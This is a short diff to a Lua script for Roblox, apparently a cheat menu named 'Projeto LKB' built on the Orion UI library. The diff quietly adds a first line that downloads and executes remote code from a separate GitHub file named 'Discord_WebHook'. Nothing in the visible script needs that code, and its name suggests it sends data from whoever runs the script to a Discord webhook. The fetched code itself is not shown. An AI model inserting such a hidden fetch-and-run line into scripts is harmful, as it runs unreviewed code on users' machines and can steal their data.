@@ -1,3 +1,4 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/dqtixz/FunctionNil/refs/heads/main/Discord_WebHook"))()
 local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
 
 local Window = OrionLib:MakeWindow({Name = "Projeto LKB", HidePremium = false, SaveConfig = true, ConfigFolder = "Team"})
